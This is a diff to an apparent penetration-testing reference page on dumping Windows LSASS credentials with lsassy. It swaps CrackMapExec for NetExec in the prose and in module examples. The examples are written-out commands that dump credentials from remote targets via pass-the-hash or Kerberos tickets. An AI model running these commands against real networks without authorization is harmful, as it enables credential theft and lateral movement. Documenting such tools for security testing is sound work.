@@ -16,7 +16,7 @@ The Local Security Authority Subsystem Service (LSASS) is a Windows service resp
 
 * several dumping methods: comsvcs.dll, [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [Dumpert](https://github.com/outflanknl/Dumpert)
 * several authentication methods: like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos)
-* it can be used either as a standalone script, as a [CrackMapExec](https://github.com/mpgn/CrackMapExec) module or as a Python library
+* it can be used either as a standalone script, as a [NetExec](https://github.com/Pennyw0rth/NetExec) module or as a Python library
 * it can interact with a Neo4j database to set [BloodHound](https://github.com/BloodHoundAD/BloodHound) targets as "owned"
 
 ```bash
@@ -29,11 +29,11 @@ lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
 # With pass-the-ticket (Kerberos)
 lsassy -k $TARGETS
 
-# CrackMapExec Module examples
-crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
-crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
-crackmapexec smb $TARGETS -k -M lsassy
-crackmapexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+# netexec Module examples
+netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
+netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+netexec smb $TARGETS -k -M lsassy
+netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
 ```
 {% endtab %}
 
